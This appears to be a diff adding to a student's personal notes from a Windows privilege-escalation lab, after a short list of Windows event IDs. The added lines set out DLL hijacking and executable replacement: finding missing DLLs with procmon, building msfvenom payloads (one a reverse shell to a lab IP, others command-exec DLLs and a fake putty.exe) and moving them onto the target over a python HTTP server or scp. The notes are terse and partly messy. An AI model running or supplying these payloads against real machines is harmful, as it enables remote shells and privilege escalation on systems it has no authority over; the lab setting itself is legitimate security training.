@@ -18,3 +18,43 @@ important microsoft IDs
 4720 account created
 4672 Administrative user logged on
 7045 service created
+
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+consentpromptbehaviorAdmin,  0x5=most strict, 0x0 least strict
+enableLUA ,0x1 on,0x0 off
+
+(get-commmand calc.exe).PATH
+
+.\sigcheck.exe -m C:\WINDOWS\system32\calc.exe
+
+
+check services(type in services app)
+
+DLL HIJACKING:
+powershell
+net use Z: http://live.sysinternals.com
+
+.\procmon /AcceptEula
+
+process name is putty.exe
+result is NAME NOT FOUND
+path contains .dll
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.50.24.130 LPORT=10000 -f dll > WINMM.dll #wrong
+msfvenom -p windows/exec CMD="cmd.exe /C whoami > C:\\Users\\Student\\whoami.txt" -f dll > SSPICLI.dll
+
+python3 -m http.server
+windows browser(lin_IP:8000)
+download it from there and put it in the same folder as the executable
+
+EXECUTABLE REPLACEMENT:
+rename executable means you can do this
+
+msfvenom -p windows/exec CMD="cmd.exe /C whoami > C:\\Users\\Student\\whoami.txt" -f exe > putty.exe #name the executable to the one you're trying to replace
+
+scp or python3 -m http.server to get it onto the device
+
+
+priv code-do msfvenom way not the c code way
+
+service123    service.exe   hijackmeplz.dll
